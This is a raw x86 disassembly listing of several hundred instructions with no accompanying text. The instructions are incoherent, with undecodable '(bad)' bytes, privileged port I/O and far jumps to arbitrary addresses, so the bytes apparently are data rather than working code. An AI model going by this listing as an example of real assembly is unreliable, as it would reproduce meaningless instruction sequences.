  4178ec:	adc    BYTE PTR [ebx-0x427f958d],0x40
  4178f3:	test   BYTE PTR [edi-0x581c2dc4],dl
  4178f9:	test   BYTE PTR [ebp-0x7f],ah
  4178fc:	pop    edi
  4178fd:	or     al,0x41
  4178ff:	add    DWORD PTR [esi-0x3dd32a49],ebp
  417905:	js     0x41789d
  417907:	das    
  417908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417909:	push   0x5e7a6bb7
  41790e:	scas   eax,DWORD PTR es:[edi]
  41790f:	test   eax,0x4cae92f2
  417914:	cwde   
  417915:	stos   BYTE PTR es:[edi],al
  417916:	inc    edi
  417917:	pop    ecx
  417918:	ret    
  417919:	xor    DWORD PTR ds:0x2976,edx
  41791e:	and    DWORD PTR [eax+eax*2],edx
  417921:	mov    BYTE PTR [esi-0x78],dh
  417924:	sbb    al,0xc4
  417926:	dec    edi
  417927:	dec    edx
  417928:	xlat   BYTE PTR ds:[ebx]
  417929:	add    cl,BYTE PTR [ecx+0x6d]
  41792c:	cmp    eax,0x21775415
  417931:	fwait
  417932:	push   esi
  417933:	mov    cl,0xb4
  417935:	mov    dh,0xb
  417937:	xor    BYTE PTR [edi+0x2303f95f],dh
  41793d:	adc    BYTE PTR ss:[eax+edx*2-0x12],ah
  417942:	inc    ebp
  417943:	mov    ebp,0xab284af1
  417948:	inc    edi
  417949:	daa    
  41794a:	hlt    
  41794b:	pop    es
  41794c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41794d:	inc    ecx
  41794e:	xchg   ebx,eax
  41794f:	jne    0x41799c
  417951:	fisttp QWORD PTR [eax]
  417953:	aas    
  417954:	gs mov ebx,0xd8c5e4d1
  41795a:	(bad)  
  41795c:	(bad)  
  41795d:	mov    ds:0x338f87ae,al
  417962:	mov    DWORD PTR [edi+ecx*8],edx
  417965:	inc    ebx
  417966:	xlat   BYTE PTR ds:[ebx]
  417967:	fistp  DWORD PTR [edi-0x3c73c32a]
  41796d:	mov    dl,0xb4
  41796f:	jge    0x4179d3
  417971:	es mov edi,0xfa10e852
  417977:	push   edi
  417978:	dec    edx
  417979:	jle    0x4179bf
  41797b:	jae    0x4179d0
  41797d:	stc    
  41797e:	ror    DWORD PTR [edx-0x78f64ac6],1
  417984:	sbb    eax,0x9fc64b1d
  417989:	in     eax,dx
  41798a:	stc    
  41798b:	push   edi
  41798c:	test   eax,0x1a2d1be9
  417991:	psubsb mm7,QWORD PTR [eax]
  417994:	aaa    
  417995:	icebp  
  417996:	repz into 
  417998:	add    DWORD PTR [edx+0x6a],esp
  41799b:	xchg   BYTE PTR [ebx-0x106e0f56],al
  4179a1:	imul   ebp,DWORD PTR [edx+0x7b122cf6],0xffffffb1
  4179a8:	fsubr  st,st(1)
  4179aa:	pop    eax
  4179ab:	mov    edx,0xdfbca4fc
  4179b0:	xor    DWORD PTR [esi+0x6],ebx
  4179b3:	and    BYTE PTR [eax-0x74],0x2
  4179b7:	jl     0x41796d
  4179b9:	inc    ebx
  4179ba:	es int3 
  4179bc:	in     eax,dx
  4179bd:	call   0x38f395aa
  4179c2:	rol    DWORD PTR [ebp-0x50],cl
  4179c5:	and    eax,0x7af329e
  4179ca:	into   
  4179cb:	pop    ebx
  4179cc:	push   es
  4179cd:	mov    ebx,0xbc0fff5c
  4179d2:	jb     0x4179ab
  4179d4:	xor    ch,ah
  4179d6:	or     esi,esi
  4179d8:	mov    ecx,0xfcefb235
  4179dd:	out    0x81,eax
  4179df:	hlt    
  4179e0:	mov    edi,0xb53ca677
  4179e5:	fstp   DWORD PTR [ecx]
  4179e7:	and    BYTE PTR [esi+edi*2-0x450e1a8d],0xdb
  4179ef:	loopne 0x417998
  4179f1:	mov    ecx,DWORD PTR [esi-0x7a]
  4179f4:	mov    dl,0xdb
  4179f6:	out    dx,eax
  4179f7:	test   al,0x9d
  4179f9:	icebp  
  4179fa:	xchg   ebp,eax
  4179fb:	jmp    0x417a15
  4179fd:	scas   eax,DWORD PTR es:[edi]
  4179fe:	fild   QWORD PTR [ebx+0x31dae2ee]
  417a04:	test   BYTE PTR [eax],al
  417a06:	imul   edx,eax,0x8da7c421
  417a0c:	inc    ebp
  417a0d:	cmp    ah,BYTE PTR [eax]
  417a0f:	cld    
  417a10:	jo     0x417a31
  417a12:	rcr    DWORD PTR [esi+0x61],cl
  417a15:	retf   
  417a16:	mov    edi,0x3ce0dcc1
  417a1b:	sbb    ch,ch
  417a1d:	xlat   BYTE PTR ds:[ebx]
  417a1e:	fnstcw WORD PTR [eax+0x7198340b]
  417a24:	mov    fs,WORD PTR [ecx-0x39]
  417a27:	dec    ebx
  417a28:	aaa    
  417a29:	cld    
  417a2a:	or     edi,DWORD PTR [edi]
  417a2c:	push   edx
  417a2d:	cwde   
  417a2e:	les    edi,FWORD PTR [ebx-0x71e68a9d]
  417a34:	es push es
  417a36:	loope  0x4179ed
  417a38:	ins    DWORD PTR es:[edi],dx
  417a39:	and    eax,0xa15e1d29
  417a3e:	sub    eax,0x795edd01
  417a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a44:	or     eax,0x5d637a90
  417a49:	xor    esi,DWORD PTR [ebx]
  417a4b:	imul   edx,edx,0xb8849a0f
  417a51:	dec    eax
  417a52:	xchg   edx,eax
  417a53:	dec    esp
  417a54:	add    al,0x87
  417a57:	(bad)  
  417a58:	retf   0x60e9
  417a5b:	and    al,0x60
  417a5d:	or     al,0xc
  417a5f:	pop    ecx
  417a60:	push   0xe76154d4
  417a65:	dec    ebx
  417a66:	xchg   edi,eax
  417a67:	cmp    DWORD PTR [esi],eax
  417a69:	out    dx,al
  417a6a:	mov    ds:0xa5fac9f5,eax
  417a6f:	mov    bh,0x8
  417a71:	pop    eax
  417a72:	retf   0xd9dd
  417a75:	mov    dh,0x13
  417a77:	cmp    DWORD PTR [esi+0x845a650],ecx
  417a7d:	or     ah,BYTE PTR [ebp+ecx*8+0x771dd542]
  417a84:	add    al,0xc6
  417a86:	mov    esi,0x22626db3
  417a8b:	gs sahf 
  417a8d:	mov    cl,0xd3
  417a8f:	test   edx,edi
  417a91:	enter  0xc94d,0x70
  417a95:	xchg   edi,ebx
  417a97:	lods   al,BYTE PTR ds:[esi]
  417a98:	xchg   BYTE PTR [eax-0x59],dh
  417a9b:	sbb    edx,DWORD PTR ds:[eax+0x7c]
  417a9f:	pop    edx
  417aa0:	add    al,0x6c
  417aa2:	stos   BYTE PTR es:[edi],al
  417aa3:	sbb    eax,0x5c3c50bf
  417aa8:	xor    ah,BYTE PTR [eax]
  417aaa:	xor    BYTE PTR [ebx],dh
  417aac:	mov    dl,0xc
  417aae:	add    al,BYTE PTR [ebx+0x1d686f60]
  417ab4:	in     al,0x27
  417ab6:	bound  esp,QWORD PTR [eax-0x77]
  417ab9:	pop    ds
  417aba:	pop    esi
  417abb:	and    ebp,DWORD PTR [eax-0x52]
  417abe:	daa    
  417abf:	xor    eax,0xafc6e24b
  417ac4:	inc    ebp
  417ac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ac6:	stos   DWORD PTR es:[edi],eax
  417ac7:	shl    BYTE PTR [ecx+0x4],0xf5
  417acb:	aas    
  417acc:	jle    0x417a9a
  417ace:	rol    BYTE PTR [esi+0x23],1
  417ad1:	inc    ecx
  417ad2:	ret    0xf578
  417ad5:	mov    ebx,cs
  417ad7:	add    eax,0xc6ccb34d
  417adc:	sub    esi,ecx
  417ade:	mov    ebx,eax
  417ae0:	inc    esi
  417ae1:	dec    ecx
  417ae2:	add    edx,DWORD PTR [ebp+0x72e1bac4]
  417ae8:	inc    ebp
  417ae9:	scas   eax,DWORD PTR es:[edi]
  417aea:	daa    
  417aeb:	daa    
  417aec:	int    0x6a
  417aee:	adc    dl,BYTE PTR gs:[esi-0x580c286c]
  417af5:	dec    ebx
  417af6:	jge    0x417abd
  417af8:	xlat   BYTE PTR ds:[ebx]
  417af9:	fs pushf 
  417afb:	sub    DWORD PTR ds:0xcd9777dd,eax
  417b01:	cmp    eax,DWORD PTR [eax+eax*1]
  417b04:	add    ebp,0x9e61bcee
  417b0a:	jecxz  0x417b42
  417b0c:	rol    BYTE PTR [esi],0xe0
  417b0f:	mov    edx,0x461cebd6
  417b14:	or     BYTE PTR [ebx+edx*8-0x4f025e31],ch
  417b1b:	sub    ebx,ebx
  417b1d:	aaa    
  417b1e:	or     dl,cl
  417b20:	push   esi
  417b21:	mov    ah,0x10
  417b23:	pop    edx
  417b24:	push   ecx
  417b25:	cwde   
  417b26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b27:	pop    ebx
  417b28:	xor    BYTE PTR [edi+eiz*1+0x3b],al
  417b2c:	xor    eax,0xb560346f
  417b31:	inc    ecx
  417b32:	xchg   edi,eax
  417b33:	adc    ah,bl
  417b35:	jp     0x417af8
  417b37:	add    al,BYTE PTR [ebx]
  417b39:	cdq    
  417b3a:	nop
  417b3b:	or     al,0x97
  417b3d:	rcr    BYTE PTR [edx+0x7de8d913],1
  417b43:	jno    0x417b21
  417b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b46:	stos   DWORD PTR es:[edi],eax
  417b47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b48:	(bad)  
  417b49:	push   ds
  417b4a:	mov    ebx,DWORD PTR [eax]
  417b4c:	cmp    BYTE PTR [esi],0xdf
  417b4f:	cmp    BYTE PTR [eax],dh
  417b51:	pop    esp
  417b52:	sbb    bh,bl
  417b54:	mov    cl,al
  417b56:	in     al,0xaf
  417b58:	mov    edx,0x1316f67
  417b5d:	fld    TBYTE PTR [edi+edx*4-0x2b]
  417b61:	push   edx
  417b62:	fisubr DWORD PTR [edx-0x1c2781aa]
  417b68:	retf   0xd852
  417b6b:	xor    eax,0xf024e529
  417b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b71:	imul   ebx,DWORD PTR [ecx-0x66e27c70],0xffffffdf
  417b78:	sub    al,0x18
  417b7a:	gs mov ebx,0x599ddc5f
  417b80:	add    ch,BYTE PTR [ebp+0x37bff3d3]
  417b86:	mov    bh,BYTE PTR [ecx]
  417b88:	cli    
  417b89:	out    dx,al
  417b8a:	in     al,dx
  417b8b:	icebp  
  417b8c:	fbld   TBYTE PTR [eax+0x33c3b42e]
  417b92:	mov    eax,edi
  417b94:	pop    ds
  417b95:	xor    eax,0x319fc1eb
  417b9a:	push   edx
  417b9b:	sub    ch,BYTE PTR [ecx+0x6]
  417b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b9f:	ss loopne 0x417b22
  417ba2:	outs   dx,DWORD PTR ds:[esi]
  417ba3:	pusha  
  417ba4:	jle    0x417bae
  417ba6:	lods   eax,DWORD PTR ds:[esi]
  417ba7:	jne    0x417b99
  417ba9:	adc    ebp,0x39dcdc78
  417baf:	xor    BYTE PTR [eax],ch
  417bb1:	outs   dx,BYTE PTR ds:[esi]
  417bb2:	aaa    
  417bb3:	mov    DWORD PTR [esi+ebx*1-0x78341bc6],0x4643f752
  417bbe:	jbe    0x417c12
  417bc0:	test   al,0xf6
  417bc2:	jnp    0x2d991bf1
  417bc8:	adc    ch,bl
  417bca:	or     eax,0x607e2c43
  417bcf:	and    ecx,eax
  417bd1:	in     al,0xa0
  417bd3:	cmp    BYTE PTR [eax+eax*8-0x457b8bd3],cl
  417bda:	scas   eax,DWORD PTR es:[edi]
  417bdb:	inc    ebp
  417bdc:	dec    ebp
  417bdd:	mov    gs,WORD PTR [edx+0x7b]
  417be0:	mov    ebp,0xcd910299
  417be5:	test   eax,0x961913ef
  417bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417beb:	dec    eax
  417bec:	pop    ds
  417bed:	test   DWORD PTR [edx+0x201ece18],edx
  417bf3:	shl    DWORD PTR [eax-0x20d61d84],1
  417bf9:	fwait
  417bfa:	cmp    eax,0x933fe127
  417bff:	retf   0x55e0
  417c02:	xchg   ebx,eax
  417c03:	push   eax
  417c04:	ror    BYTE PTR [edx+0x3b],0x4e
  417c08:	push   ds
  417c09:	mul    DWORD PTR [ebp+0x224b42cd]
  417c0f:	aas    
  417c10:	add    dl,bl
  417c12:	mov    al,ds:0x2c05a520
  417c17:	cmp    eax,0x204cbd5
  417c1c:	sub    DWORD PTR [eax+0x53],esp
  417c1f:	jecxz  0x417bc9
  417c21:	jo     0x417be9
  417c23:	adc    eax,0xcbbc2165
  417c28:	pop    ecx
  417c29:	icebp  
  417c2a:	add    edi,edi
  417c2c:	mov    bl,0x7e
  417c2e:	pushf  
  417c2f:	es mov edi,0x77d115d1
  417c35:	inc    ebx
  417c36:	rcr    BYTE PTR [eax],0x7a
  417c39:	push   ebx
  417c3a:	adc    dh,BYTE PTR [eax-0x7345e384]
  417c40:	cmp    al,0x56
  417c42:	stos   BYTE PTR es:[edi],al
  417c43:	dec    ecx
  417c44:	nop
  417c45:	lds    ebp,FWORD PTR [ebx]
  417c47:	sbb    dh,BYTE PTR [esi]
  417c49:	mov    al,BYTE PTR [ecx+0x9]
  417c4c:	push   cs
  417c4d:	punpckldq mm5,DWORD PTR [ebx-0x8]
  417c51:	ins    DWORD PTR es:[edi],dx
  417c52:	mov    eax,0x7cb2959
  417c57:	jmp    0x8b7f:0x4efb0e53
  417c5e:	xor    al,0xa6
  417c60:	mov    eax,0x2ae8635
  417c65:	mov    ds:0x530c7545,ax
  417c6b:	imul   edx,DWORD PTR [eax-0x3a],0x40
  417c6f:	and    eax,0xe7d9fbb9
  417c74:	sbb    BYTE PTR [eax],bh
  417c76:	sub    ebx,DWORD PTR [ebx]
  417c78:	cmp    bl,BYTE PTR [edi]
  417c7a:	jg     0x417cc3
  417c7c:	fwait
  417c7d:	imul   BYTE PTR [ebx]
  417c7f:	test   eax,0x7764324c
  417c84:	push   esp
  417c85:	retf   0x8bdc
  417c88:	xchg   esp,eax
  417c89:	sbb    eax,0x5db75038
  417c8e:	jns    0x417c2a
  417c90:	mov    DWORD PTR [eax+0x63],ecx
  417c93:	mov    BYTE PTR [esi],al
  417c95:	sbb    cl,bl
  417c97:	dec    ebp
  417c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c99:	test   DWORD PTR [ebx-0xf74183d],0x416d0a22
  417ca3:	mov    edi,0x17dd198b
  417ca8:	js     0x417cd3
  417caa:	clc    
  417cab:	add    eax,0x5ac5043c
  417cb0:	bound  esi,QWORD PTR [edx+0x3e88ffd7]
  417cb6:	mov    ebx,DWORD PTR [ebp+0x7]
  417cb9:	pop    ebx
  417cba:	adc    al,0xec
  417cbc:	aad    0x37
  417cbe:	sbb    eax,0x15eb35a2
  417cc3:	jnp    0x417d1b
  417cc5:	pop    ds
  417cc6:	jb     0x417c6d
  417cc8:	mov    ebp,0xecb77450
  417ccd:	xchg   esi,eax
  417cce:	jl     0x417cc8
  417cd0:	fisub  WORD PTR [eax]
  417cd2:	icebp  
  417cd3:	push   ebp
  417cd4:	test   eax,0x197177c4
  417cd9:	and    edx,edx
  417cdb:	sti    
  417cdc:	das    
  417cdd:	inc    ebx
  417cde:	sbb    eax,0x5bd62bf4
  417ce3:	mov    BYTE PTR [eax-0x25200edf],dl
  417ce9:	cmp    ecx,esp
  417ceb:	loopne 0x417cd8
  417ced:	xchg   esi,eax
  417cee:	imul   ebp,DWORD PTR [ecx+0x4e],0x13
  417cf2:	adc    eax,0xaa6978fa
  417cf7:	inc    edi
  417cf8:	sar    DWORD PTR [ecx-0x62],0x2d
  417cfc:	out    0xfe,al
  417cfe:	pop    ds
  417cff:	sub    ebp,DWORD PTR [ecx+0x68]
  417d02:	mov    eax,0x81cf19ca
  417d07:	pop    edx
  417d08:	stos   BYTE PTR es:[edi],al
  417d09:	jp     0x417d27
  417d0b:	dec    ecx
  417d0c:	dec    esi
  417d0d:	mul    BYTE PTR [ebx]
  417d0f:	popf   
  417d10:	test   DWORD PTR ds:0x2809badb,0x3f139a7c
  417d1a:	push   0x7c
  417d1c:	jae    0x417ca6
  417d1e:	mov    dl,0xa7
  417d20:	icebp  
  417d21:	or     BYTE PTR [eax],0x21
  417d24:	inc    ecx
  417d25:	push   esi
  417d26:	or     ebp,DWORD PTR [eax]
  417d28:	test   DWORD PTR [edx],esi
  417d2a:	adc    ebx,ecx
  417d2c:	jge    0x417d8a
  417d2e:	mov    al,0x14
  417d30:	outs   dx,BYTE PTR ds:[esi]
  417d31:	fs clc 
  417d33:	cmp    DWORD PTR [ebx],ecx
  417d35:	ror    BYTE PTR [ebx+0x7518ab98],1
  417d3b:	sub    ecx,DWORD PTR ds:0x11369cb5
  417d41:	mov    WORD PTR [ebx-0x434d9eea],?
  417d47:	bnd js 0x417d5d
  417d4a:	xchg   ecx,eax
  417d4b:	mov    bh,0xc8
  417d4d:	sahf   
  417d4e:	inc    edx
  417d4f:	jge    0x417d15
  417d51:	jmp    0x417dbd
  417d53:	(bad)  
  417d54:	out    0xb9,al
  417d56:	jb     0x417d4b
  417d58:	stos   BYTE PTR es:[edi],al
  417d59:	in     eax,0xe7
  417d5b:	fstp   TBYTE PTR [ecx+0x379f398e]
  417d61:	xchg   ecx,eax
  417d62:	into   
  417d63:	adc    esi,0xf3ed38ac
  417d69:	pusha  
  417d6a:	je     0x417dbd
  417d6c:	inc    esi
  417d6d:	imul   eax,DWORD PTR [eax],0x32
  417d70:	pop    ecx
  417d71:	pop    ds
  417d72:	pushf  
  417d73:	sub    esi,esp
  417d75:	xchg   ebx,eax
  417d76:	mov    bh,0xff
  417d78:	xchg   esp,eax
  417d79:	fbld   TBYTE PTR [ecx-0x6c]
  417d7c:	push   ds
  417d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d7e:	push   cs
  417d7f:	xchg   ecx,eax
  417d80:	inc    ebx
  417d81:	inc    ecx
  417d82:	jmp    0x417d57
  417d84:	rcr    DWORD PTR [ebx-0x15],cl
  417d87:	sbb    bh,al
  417d89:	add    al,BYTE PTR [esi-0x21]
  417d8c:	jbe    0x417dca
  417d8e:	mov    esp,0xec4bfcaa
  417d93:	pop    edi
  417d94:	jbe    0x417dce
  417d96:	mov    bl,0x2
  417d98:	(bad)  
  417d99:	mov    cs,WORD PTR [esi-0x76]
  417d9c:	pop    edx
  417d9d:	mov    bh,0xe3
  417d9f:	jmp    0x417d55
  417da1:	xchg   esp,eax
  417da2:	cmp    DWORD PTR [esi-0x544f4832],ebp
  417da8:	mov    bl,0xc2
  417daa:	push   ss
  417dab:	(bad)  
  417dac:	mov    esp,0x77bceb56
  417db1:	adc    bh,BYTE PTR [eax+ebp*1]
  417db4:	ins    BYTE PTR es:[edi],dx
  417db5:	aam    0xba
  417db7:	add    bh,BYTE PTR [esi]
  417db9:	fisttp DWORD PTR [edi+0x7b]
  417dbc:	add    cl,BYTE PTR [ecx+ebx*2-0x56]
  417dc0:	lds    edx,FWORD PTR ds:0xabb0794
  417dc6:	imul   eax,edi,0xffffffd7
  417dc9:	in     al,0xaa
  417dcb:	test   eax,0xffe8c63c
  417dd0:	fbstp  TBYTE PTR [edx-0x5e40f7e1]
  417dd6:	call   0x3b0e:0x525428ca
  417ddd:	mov    al,0xbd
  417ddf:	shr    eax,cl
  417de1:	push   ecx
  417de2:	cmc    
  417de3:	retf   0x4ae
  417de6:	inc    ecx
  417de7:	or     dh,BYTE PTR [ebx+0x4]
  417dea:	or     cl,BYTE PTR [ebp+0x49]
  417ded:	dec    ecx
  417dee:	pop    ebp
  417def:	jle    0x417e56
  417df1:	cmpxchg bh,bl
  417df4:	out    dx,eax
  417df5:	ds in  al,0x86
  417df8:	cmc    
  417df9:	jge    0x417dea
  417dfb:	pop    ebp
  417dfc:	stc    
  417dfd:	mov    ds:0xbf5809ea,al
  417e02:	daa    
  417e03:	sub    esp,edi
  417e05:	pop    ss
  417e06:	scas   al,BYTE PTR es:[edi]
  417e07:	sbb    DWORD PTR [edi-0x4e23a044],0xfffffff8
  417e0e:	mov    edx,0x70f9479
  417e13:	retf   0x80be
  417e16:	jge    0x417e34
  417e18:	stos   DWORD PTR es:[edi],eax
  417e19:	pop    es
  417e1a:	sub    al,0x57
  417e1c:	mov    esp,DWORD PTR [edi+0x64]
  417e1f:	xor    ax,0x3fb0
  417e23:	cmp    eax,0x9fad17d5
  417e28:	xor    DWORD PTR [edi-0x6e],ebp
  417e2b:	sti    
  417e2c:	retf   0xe19b
  417e2f:	popf   
  417e30:	sbb    al,0xeb
  417e32:	mov    eax,0xc88222c3
  417e37:	dec    edi
  417e38:	in     al,dx
  417e39:	and    bl,BYTE PTR [ecx+0x60a82c8d]
  417e3f:	push   es
  417e40:	xor    eax,0x6932abbb
  417e45:	cld    
  417e46:	push   ebp
  417e47:	mov    eax,ds:0x7e746795
  417e4c:	inc    esi
  417e4d:	js     0x417e59
  417e4f:	xchg   BYTE PTR [ecx-0xe87514f],cl
  417e55:	popa   
  417e56:	mov    dl,0xbd
  417e58:	mov    esi,0xec5b89f2
  417e5d:	leave  
  417e5e:	inc    esp
  417e5f:	lods   al,BYTE PTR ds:[esi]
  417e60:	fadd   st(5),st
  417e62:	ret    
  417e63:	fcomp  QWORD PTR [ecx-0x21]
  417e66:	daa    
  417e67:	pop    ds
  417e68:	arpl   WORD PTR [eax+eax*8+0x3f],bp
  417e6c:	cwde   
  417e6d:	leave  
  417e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e70:	sbb    al,0xb8
  417e72:	lahf   
  417e73:	outs   dx,BYTE PTR ds:[esi]
  417e74:	cmp    edi,DWORD PTR [ebp+0x2a]
  417e77:	xor    dl,bl
  417e79:	int3   
  417e7a:	xor    DWORD PTR [ebp+0x5400f166],0xffffffc9
  417e81:	fdiv   DWORD PTR [ebp-0x57]
  417e84:	push   DWORD PTR [eax-0x76]
  417e87:	pop    ds
  417e88:	ja     0x417ee5
  417e8a:	or     al,BYTE PTR [edi]
  417e8c:	outs   dx,DWORD PTR ds:[esi]
  417e8d:	mov    ebx,0xa47111be
  417e92:	mov    dl,0xfd
  417e94:	jmp    0x417e16
  417e96:	call   0xccc0:0xd6ccf46
  417e9d:	hlt    
  417e9e:	cmp    dh,BYTE PTR [edx+edi*2-0x52]
  417ea2:	push   0x117e0eff
  417ea7:	and    eax,0x218cb02f
  417eac:	sbb    esp,ecx
  417eae:	cmp    cl,BYTE PTR [ebx]
  417eb0:	mov    DWORD PTR [ebx+0x7d866f01],0xdf427f61
  417eba:	jmp    0x1ca906b2
  417ebf:	mov    esi,0x5da19fa0
  417ec4:	les    ebx,FWORD PTR ds:0x2933aaf
  417eca:	mov    dl,dh
  417ecc:	rcr    BYTE PTR [edi+0x1ec2351a],cl
  417ed2:	mov    edi,0x75f4dc1d
  417ed7:	jge    0x417eae
  417ed9:	mov    edx,0x956ddad9
  417ede:	fnsave [ebp+0xd]
  417ee1:	mov    BYTE PTR [esi-0x3d536a9b],ah
  417ee7:	mov    BYTE PTR [ebp-0x7c],dl
  417eea:	push   esi
  417eeb:	cli    
  417eec:	pop    eax
  417eed:	aaa    
  417eee:	mov    cl,0xf2
  417ef0:	mov    ecx,0x588374d5
  417ef5:	cmc    
  417ef6:	and    bl,dl
  417ef8:	xor    ecx,esi
  417efa:	push   ecx
  417efb:	mov    ds:0x683be3b5,eax
  417f00:	inc    ebp
  417f01:	pop    edi
  417f02:	and    BYTE PTR [edx+0x75],bl
  417f05:	loop   0x417f47
  417f07:	add    DWORD PTR [edi-0x4bbffb91],edx
  417f0d:	mov    WORD PTR [ecx+0x1b],gs
  417f10:	sti    
  417f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f12:	push   0xffffffea
  417f14:	ret    0x4976
  417f17:	neg    DWORD PTR [ecx]
  417f19:	fcomp  DWORD PTR [edx]
  417f1b:	mov    dh,BYTE PTR [edi-0x62]
  417f1e:	push   ecx
  417f1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f21:	test   al,0x67
  417f23:	shl    BYTE PTR [edi+0x1f],1
  417f26:	daa    
  417f27:	call   0xa9ed:0x11b42500
  417f2e:	push   cs
  417f2f:	test   BYTE PTR [edi-0x406ea469],cl
  417f35:	stos   BYTE PTR es:[edi],al
  417f36:	pop    esp
  417f37:	xor    BYTE PTR [ecx+ebx*2-0x397a462d],ah
  417f3e:	not    esi
  417f40:	cmp    ebp,DWORD PTR fs:[eax]
  417f43:	sbb    DWORD PTR [edi],ecx
  417f45:	xor    esp,eax
  417f47:	inc    edx
  417f48:	not    BYTE PTR [eax-0x6d]
  417f4b:	cdq    
  417f4c:	ds cwde 
  417f4e:	or     eax,0xb2b63e3a
  417f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f54:	cld    
  417f55:	pusha  
  417f56:	pop    ecx
  417f57:	test   eax,0x346540a0
  417f5c:	pop    ds
  417f5d:	and    edx,esi
  417f5f:	mov    ds:0xbad0c8f9,al
  417f64:	mov    eax,0xf9cc9ca4
  417f69:	mov    edx,0x727140b9
  417f6e:	idiv   BYTE PTR [eax+0x57ba4248]
  417f74:	cli    
  417f75:	je     0x417fd4
  417f77:	clc    
  417f78:	sub    al,0xd4
  417f7a:	es sti 
  417f7c:	not    BYTE PTR [edx+0x25e5c480]
  417f82:	lods   al,BYTE PTR ds:[esi]
  417f83:	(bad)  
  417f84:	push   esi
  417f85:	inc    ecx
  417f86:	sar    BYTE PTR [edi+0xb],0x52
  417f8a:	jge    0x417fa1
  417f8c:	shl    DWORD PTR gs:[edi-0x1d],cl
  417f90:	je     0x417f60
  417f92:	imul   esi,DWORD PTR [edx+0x31],0xda7a3cdb
  417f99:	fbstp  TBYTE PTR [ecx+0x7a7e53a6]
  417f9f:	out    dx,eax
  417fa0:	jne    0x417fd2
  417fa2:	retf   
  417fa3:	jmp    0xc222:0xffe93a74
  417faa:	add    BYTE PTR [ecx],dh
  417fac:	inc    edx
  417fad:	fsub   QWORD PTR [edi-0x75]
  417fb0:	and    al,0xd6
  417fb2:	inc    DWORD PTR [eax]
  417fb4:	mov    ebx,0xec8da992
  417fb9:	out    0xcd,al
  417fbb:	xor    esp,DWORD PTR [edx]
  417fbd:	push   edi
  417fbe:	xchg   edx,eax
  417fbf:	loopne 0x417fa9
  417fc1:	pop    ebx
  417fc2:	push   ebp
  417fc3:	pop    ebp
  417fc4:	aaa    
  417fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fc6:	imul   esp,ebx,0xffffff90
  417fc9:	std    
  417fca:	js     0x41801d
  417fcc:	retf   
  417fcd:	fist   DWORD PTR [esi]
  417fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fd0:	push   0x4a
  417fd2:	push   edi
  417fd3:	int    0xf
  417fd5:	mov    dl,0x53
  417fd7:	adc    al,0x90
  417fd9:	pop    es
  417fda:	aas    
  417fdb:	or     BYTE PTR [esp+ebp*4],ch
  417fde:	xor    DWORD PTR [eax-0xb0b38ba],ebp
  417fe4:	fidiv  WORD PTR [ecx+0x1]
  417fe7:	fisubr WORD PTR ds:0x85085c53
  417fed:	mov    ah,0x1c
  417fef:	pop    edx
  417ff0:	pop    ss
  417ff1:	fld    DWORD PTR [esi-0x3892cca9]
  417ff7:	sub    al,0xac
  417ff9:	push   ds
  417ffa:	in     eax,dx
  417ffb:	pop    edi
  417ffc:	ret    0x8ace
  417fff:	lods   al,BYTE PTR ds:[esi]
  418000:	dec    BYTE PTR [ebp+0x2b776ace]
  418006:	and    BYTE PTR ds:0x8370c599,0xfd
  41800d:	mov    gs,WORD PTR [ebx-0x35]
  418010:	xor    BYTE PTR [ecx+edx*1+0x23],0x13
  418015:	js     0x418050
  418017:	sbb    dl,BYTE PTR [esi+0x2c786c9e]
  41801d:	or     ecx,ebx
  41801f:	ror    bh,1
  418021:	ins    BYTE PTR es:[edi],dx
  418022:	shl    DWORD PTR [ebx-0xd],0xaf
  418026:	xchg   edi,eax
  418027:	into   
  418028:	jg     0x41806c
  41802a:	xchg   BYTE PTR [ebp-0x4c],al
  41802d:	inc    edx
  41802e:	ret    
  41802f:	pusha  
  418030:	and    edi,edx
  418032:	(bad)  
  418033:	dec    ebx
  418034:	sbb    DWORD PTR [esi+0x63],esi
  418037:	sbb    bl,0x70
  41803a:	mov    ah,BYTE PTR [ebx+0x2c]
  41803d:	cmp    edx,eax
  41803f:	jae    0x418004
  418041:	or     DWORD PTR [ecx+0x6b87b4f5],ebx
  418047:	push   0xe11deea7
  41804c:	test   ah,ah
  41804e:	add    eax,0xce4b3bb0
  418053:	push   ebx
  418054:	icebp  
  418055:	adc    dh,BYTE PTR [esi]
  418057:	aas    
  418058:	inc    esp
  418059:	and    ecx,DWORD PTR [ebp-0x25efa4a1]
  41805f:	push   esp
  418060:	add    ebp,DWORD PTR [edi-0x6f]
  418063:	cli    
  418064:	imul   ecx,DWORD PTR [eax+0x79104905],0xfffffff0
  41806b:	adc    dl,al
  41806d:	mov    DWORD PTR [ecx+0x19],0x5d29fa4
  418074:	jge    0x4180aa
  418076:	mov    ah,0x81
  418078:	jmp    0x4180f1
  41807a:	xor    BYTE PTR [edx+eax*1+0x3c63bedf],dl
  418081:	das    
  418082:	fwait
  418083:	test   ch,bh
  418085:	loopne 0x418036
  418087:	scas   eax,DWORD PTR es:[edi]
  418088:	outs   dx,BYTE PTR ds:[esi]
  418089:	pop    eax
  41808a:	ret    0x1fc0
  41808d:	mov    edx,0xa95ca338
  418092:	enter  0x26d1,0xf2
  418096:	stc    
  418097:	es adc dl,bh
  41809a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41809b:	or     BYTE PTR [eax+0x643d01a9],0xb1
